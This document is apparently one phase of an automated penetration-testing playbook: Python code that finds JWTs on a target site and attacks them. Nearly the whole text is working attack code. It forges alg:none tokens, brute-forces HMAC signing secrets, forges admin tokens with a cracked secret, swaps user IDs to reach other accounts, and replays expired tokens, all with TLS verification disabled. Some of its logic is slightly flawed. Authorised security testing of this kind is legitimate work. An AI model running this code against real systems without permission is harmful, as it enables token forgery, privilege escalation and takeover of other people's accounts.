**Phase 9b — Deep JWT Testing**

  Run AFTER Phase 9 if JWT tokens were detected. Tests algorithm attacks, weak secrets,
  token manipulation, and sensitive data exposure in JWT claims.

  ```python
  import json, base64, hashlib, hmac, time
  from urllib.parse import urljoin

  BASE    = _G['BASE']
  session = _G.get('session_a') or _G.get('session')

  jwt_findings = []

  # ── Collect all JWTs from cookies, headers, stored tokens, and localStorage ──
  jwts = {}

  def _is_jwt(val):
      """Check if a string looks like a JWT (3 base64url parts, header starts with ey)."""
      if not isinstance(val, str):
          return False
      return val.count('.') == 2 and val.split('.')[0].startswith('ey')

  # 1. Check cookies
  for name, val in session.cookies.items():
      if _is_jwt(val):
          jwts[f'cookie:{name}'] = val

  # 2. Check Authorization header on session
  auth_hdr = session.headers.get('Authorization', '')
  if auth_hdr.startswith('Bearer ') and _is_jwt(auth_hdr.split(' ', 1)[1]):
      jwts['Authorization'] = auth_hdr.split(' ', 1)[1]

  # 3. Check _G for stored tokens (Phase 3 stores as auth_token)
  for gkey in ('auth_token', 'jwt_token', 'token', 'access_token', 'id_token'):
      gval = _G.get(gkey, '')
      if _is_jwt(str(gval)):
          jwts[f'_G[{gkey}]'] = str(gval)

  # 4. Check AUTH_HEADER legacy key
  auth_header = _G.get('AUTH_HEADER', '')
  if auth_header.startswith('Bearer ') and _is_jwt(auth_header.split(' ', 1)[1]):
      jwts['AUTH_HEADER'] = auth_header.split(' ', 1)[1]

  # 5. Check JWT_TOKENS stored by Phase 4 (session management)
  for jname, jval in _G.get('JWT_TOKENS', {}).items():
      if _is_jwt(jval) and jval not in jwts.values():
          jwts[f'phase4:{jname}'] = jval

  # 6. Try fetching a fresh token from login endpoint (if we know it)
  if not jwts and _G.get('api_login_url') and _G.get('api_login_fields'):
      try:
          _lr = session.post(_G['api_login_url'], json=_G['api_login_fields'], timeout=10)
          _ld = _lr.json() if _lr.status_code in (200, 201) else {}
          for _k, _v in (list(_ld.items()) if isinstance(_ld, dict) else []):
              if _is_jwt(str(_v)):
                  jwts[f'login_resp:{_k}'] = str(_v)
              elif isinstance(_v, dict):
                  for _k2, _v2 in _v.items():
                      if _is_jwt(str(_v2)):
                          jwts[f'login_resp:{_k}.{_k2}'] = str(_v2)
      except Exception:
          pass

  if not jwts:
      print("[INFO] No JWT tokens found anywhere — skipping deep JWT testing")
      print("  Checked: cookies, Authorization header, _G[auth_token], login response")
  else:
      print(f"[JWT] Found {len(jwts)} JWT token(s): {list(jwts.keys())}")

      def b64_decode(s):
          s += '=' * (4 - len(s) % 4)
          return base64.urlsafe_b64decode(s)

      def b64_encode(data):
          return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

      for token_name, token in jwts.items():
          parts = token.split('.')
          if len(parts) != 3:
              continue

          try:
              header = json.loads(b64_decode(parts[0]))
              payload = json.loads(b64_decode(parts[1]))
          except Exception as e:
              print(f"  [ERROR] Failed to decode {token_name}: {e}")
              continue

          alg = header.get('alg', 'unknown')
          print(f"\n  Token: {token_name}")
          print(f"  Algorithm: {alg}")
          print(f"  Header: {json.dumps(header)}")
          print(f"  Payload: {json.dumps(payload, indent=2)[:500]}")

          # ═══════════════════════════════════════════════════════════
          # TEST 1 — Sensitive data in JWT payload
          # ═══════════════════════════════════════════════════════════
          SENSITIVE_KEYS = ['password', 'passwd', 'pwd', 'secret', 'hash', 'ssn',
                           'credit_card', 'cc_number', 'api_key', 'token', 'private',
                           'salary', 'dob', 'date_of_birth', 'social_security']
          for key in payload:
              if any(s in key.lower() for s in SENSITIVE_KEYS):
                  print(f"  [CRITICAL] Sensitive data in JWT: '{key}' = '{str(payload[key])[:100]}'")
                  jwt_findings.append({
                      'type': 'jwt-sensitive-data', 'token': token_name,
                      'detail': f"Key '{key}' contains sensitive data in JWT payload",
                  })

          # Check for password hashes (common patterns)
          for key, val in payload.items():
              sval = str(val)
              if len(sval) == 32 and all(c in '0123456789abcdef' for c in sval.lower()):
                  print(f"  [CRITICAL] MD5 hash in JWT payload: {key} = {sval}")
                  jwt_findings.append({'type': 'jwt-hash-leak', 'token': token_name, 'detail': f"{key}={sval}"})
              elif len(sval) == 64 and all(c in '0123456789abcdef' for c in sval.lower()):
                  print(f"  [CRITICAL] SHA-256 hash in JWT payload: {key} = {sval[:20]}...")
                  jwt_findings.append({'type': 'jwt-hash-leak', 'token': token_name, 'detail': f"{key}=SHA256"})

          # ═══════════════════════════════════════════════════════════
          # TEST 2 — Algorithm "none" attack
          # ═══════════════════════════════════════════════════════════
          print(f"\n  Testing alg:none attack...")
          none_variants = ['none', 'None', 'NONE', 'nOnE']
          for none_alg in none_variants:
              forged_header = b64_encode(json.dumps({"alg": none_alg, "typ": "JWT"}).encode())
              forged_payload = b64_encode(json.dumps(payload).encode())
              forged_token = f"{forged_header}.{forged_payload}."

              # Try using the forged token
              test_session = __import__('requests').Session()
              test_session.verify = False
              if token_name in session.cookies:
                  test_session.cookies.set(token_name, forged_token)
              test_session.headers['Authorization'] = f'Bearer {forged_token}'

              try:
                  # Hit an authenticated endpoint
                  auth_pages = list(_G.get('AUTH_PAGES', {}).keys())[:3]
                  test_url = auth_pages[0] if auth_pages else BASE + '/api/me'
                  r = test_session.get(test_url, timeout=10)
                  if r.status_code == 200 and 'login' not in r.url.lower():
                      auth_signs = ['email', 'username', 'profile', 'admin', 'dashboard', 'basket']
                      if any(s in r.text.lower() for s in auth_signs):
                          print(f"  [CRITICAL] alg:none ACCEPTED! Server validates token without signature")
                          print(f"  Forged token: {forged_token[:80]}...")
                          print(f"  Response: {r.text[:300]}")
                          jwt_findings.append({
                              'type': 'jwt-alg-none', 'token': token_name,
                              'detail': f'alg:{none_alg} accepted — full token forgery possible',
                          })
                          break
              except Exception:
                  continue
          else:
              print(f"  [INFO] alg:none rejected (good)")

          # ═══════════════════════════════════════════════════════════
          # TEST 3 — Weak secret brute-force (HMAC algorithms)
          # ═══════════════════════════════════════════════════════════
          if alg.startswith('HS'):
              print(f"\n  Testing weak JWT secrets (alg={alg})...")
              COMMON_SECRETS = [
                  'secret', 'password', '123456', 'changeme', 'admin', 'jwt_secret',
                  'key', 'private', 'test', 'default', 'qwerty', 'letmein', 'welcome',
                  'super_secret', 'jwt', 'token', 'mysecret', 'app_secret', 'your-256-bit-secret',
                  'secret123', 'password123', 'secretkey', 'my-secret', 'api-key', 'passw0rd',
                  'shhhhh', 'keyboard cat', 'gat5', 'SuperS3cretK3y',
              ]
              # Also add any secrets found in JS scanning
              for jf in _G.get('JS_FINDINGS', []):
                  if jf.get('type') in ('api_key', 'secret', 'token', 'password'):
                      val = jf.get('value', '')
                      if val and val not in COMMON_SECRETS:
                          COMMON_SECRETS.append(val)

              signing_input = f"{parts[0]}.{parts[1]}".encode()
              original_sig = b64_decode(parts[2])

              hash_func = hashlib.sha256 if '256' in alg else hashlib.sha384 if '384' in alg else hashlib.sha512
              found_secret = None
              for secret in COMMON_SECRETS:
                  sig = hmac.new(secret.encode(), signing_input, hash_func).digest()
                  if sig == original_sig:
                      found_secret = secret
                      break

              if found_secret:
                  print(f"  [CRITICAL] JWT secret cracked: '{found_secret}'")
                  print(f"  Attacker can forge ANY token with this secret!")
                  jwt_findings.append({
                      'type': 'jwt-weak-secret', 'token': token_name,
                      'detail': f"Secret: '{found_secret}' — full token forgery possible",
                  })

                  # Forge an admin token as proof
                  admin_payload = dict(payload)
                  for key in ('role', 'admin', 'isAdmin', 'is_admin', 'permission'):
                      if key in admin_payload:
                          admin_payload[key] = 'admin' if key == 'role' else True
                  admin_payload_b64 = b64_encode(json.dumps(admin_payload).encode())
                  admin_signing = f"{parts[0]}.{admin_payload_b64}".encode()
                  admin_sig = b64_encode(hmac.new(found_secret.encode(), admin_signing, hash_func).digest())
                  admin_token = f"{parts[0]}.{admin_payload_b64}.{admin_sig}"
                  print(f"  Forged admin token: {admin_token[:80]}...")
                  _G['FORGED_JWT'] = admin_token
              else:
                  print(f"  [INFO] JWT secret not in common list ({len(COMMON_SECRETS)} tested)")

          # ═══════════════════════════════════════════════════════════
          # TEST 4 — Algorithm confusion (RS256 → HS256)
          # ═══════════════════════════════════════════════════════════
          if alg.startswith('RS') or alg.startswith('ES') or alg.startswith('PS'):
              print(f"\n  Testing algorithm confusion ({alg} → HS256)...")
              # If the server uses RS256 but accepts HS256, we can sign with the public key
              # First, try to find the public key
              pubkey_urls = [
                  BASE + '/.well-known/jwks.json',
                  BASE + '/jwks.json',
                  BASE + '/api/jwks',
                  BASE + '/.well-known/openid-configuration',
              ]
              public_key = None
              for pk_url in pubkey_urls:
                  try:
                      r = session.get(pk_url, timeout=5)
                      if r.status_code == 200:
                          print(f"  [INFO] JWKS endpoint found: {pk_url}")
                          jwks_data = r.json()
                          print(f"  JWKS: {json.dumps(jwks_data)[:500]}")
                          jwt_findings.append({
                              'type': 'jwt-jwks-exposed', 'token': token_name,
                              'detail': f"JWKS at {pk_url} — may enable algorithm confusion attack",
                          })
                          break
                  except Exception:
                      continue

          # ═══════════════════════════════════════════════════════════
          # TEST 5 — Token manipulation (change user ID / role)
          # ═══════════════════════════════════════════════════════════
          print(f"\n  Testing token manipulation...")
          # If we cracked the secret, forge tokens with different user IDs
          if _G.get('FORGED_JWT'):
              id_fields = ['user_id', 'uid', 'sub', 'id', 'userId', 'user']
              for id_field in id_fields:
                  if id_field in payload:
                      original_id = payload[id_field]
                      # Try IDs 1-5 (admin is usually 1)
                      for test_id in [1, 2, 3, 0, 999]:
                          if test_id == original_id:
                              continue
                          tampered_payload = dict(payload)
                          tampered_payload[id_field] = test_id
                          tp_b64 = b64_encode(json.dumps(tampered_payload).encode())
                          ts_input = f"{parts[0]}.{tp_b64}".encode()
                          ts_sig = b64_encode(hmac.new(found_secret.encode(), ts_input, hash_func).digest())
                          tampered_token = f"{parts[0]}.{tp_b64}.{ts_sig}"

                          test_s = __import__('requests').Session()
                          test_s.verify = False
                          test_s.cookies.set(token_name, tampered_token)
                          test_s.headers['Authorization'] = f'Bearer {tampered_token}'
                          try:
                              auth_pages = list(_G.get('AUTH_PAGES', {}).keys())[:1]
                              r = test_s.get(auth_pages[0] if auth_pages else BASE, timeout=10)
                              if r.status_code == 200:
                                  print(f"  [CRITICAL] Token accepted with {id_field}={test_id} (original: {original_id})")
                                  jwt_findings.append({
                                      'type': 'jwt-idor', 'token': token_name,
                                      'detail': f"Changed {id_field} from {original_id} to {test_id} — accepted",
                                  })
                                  break
                          except Exception:
                              continue
                      break  # Only test first matching ID field

          # ═══════════════════════════════════════════════════════════
          # TEST 6 — Expired token replay
          # ═══════════════════════════════════════════════════════════
          if 'exp' in payload:
              import time as _time
              exp_time = payload['exp']
              now = int(_time.time())
              if exp_time < now:
                  print(f"  [INFO] Token already expired ({exp_time} < {now})")
                  # Try using the expired token
                  try:
                      auth_pages = list(_G.get('AUTH_PAGES', {}).keys())[:1]
                      r = session.get(auth_pages[0] if auth_pages else BASE, timeout=10)
                      if r.status_code == 200 and 'login' not in r.url.lower():
                          print(f"  [HIGH] Expired token still accepted! Server does not validate 'exp' claim")
                          jwt_findings.append({
                              'type': 'jwt-expired-accepted', 'token': token_name,
                              'detail': 'Expired token accepted — no expiry validation',
                          })
                  except Exception:
                      pass

        # Summary
        print(f"\n=== JWT SUMMARY: {len(jwt_findings)} issues found ===")
        for f in jwt_findings:
            sev = 'CRITICAL' if f['type'] in ('jwt-alg-none','jwt-weak-secret','jwt-sensitive-data',
                                                'jwt-hash-leak','jwt-idor') else 'HIGH'
            print(f"  [{sev}] {f['type']}: {f['detail'][:80]}")
        if jwt_findings:
            _G.setdefault('FINDINGS', []).extend([
                {'severity': 'CRITICAL' if f['type'] in ('jwt-alg-none','jwt-weak-secret',
                    'jwt-sensitive-data','jwt-hash-leak','jwt-idor') else 'HIGH',
                 'title': f"JWT — {f['type']}",
                 'url': BASE,
                 'method': 'GET',
                 'evidence': f['detail'],
                 'impact': 'Token forgery, privilege escalation, sensitive data exposure',
                 'screenshot': '',
                 'detail': f} for f in jwt_findings
            ])

# POST-PHASE SCREENSHOT CHECKPOINT — verify JWT findings with screenshots
print("\n[SCREENSHOT CHECKPOINT] Verify all JWT findings:")
for finding in _G['FINDINGS']:
    if 'JWT' in finding.get('title', ''):
        if not finding.get('screenshot'):
            print(f"  [REQUIRED] Take screenshot for: {finding.get('title')}")
            print(f"    Navigate to: {finding.get('url')}")
            print(f"    browser_action(action='navigate', url='{finding.get('url')}')")
            print(f"    browser_action(action='screenshot', filename='phase_09b_jwt_{finding.get('title').replace('JWT — ','').lower()[:40]}.png')")
            print(f"    Update finding['screenshot'] with the filename")
print("\n  JWT findings may require showing the decoded token structure or forged token in action. Verify via browser DevTools Application tab for JWT content.")
  ```
